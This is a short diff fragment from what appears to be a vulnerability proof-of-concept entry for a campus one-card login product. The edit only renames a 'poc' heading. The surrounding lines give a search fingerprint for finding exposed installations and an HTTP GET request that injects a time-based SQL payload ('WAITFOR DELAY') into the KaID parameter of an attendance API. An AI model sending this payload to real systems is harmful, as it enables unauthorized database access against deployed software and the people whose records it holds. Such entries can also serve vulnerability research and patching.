@@ -8,7 +8,7 @@
 body="http://www.ahkxsoft.com/" && body="一卡通登录"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /api/get_kq_tj_today?KaID=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
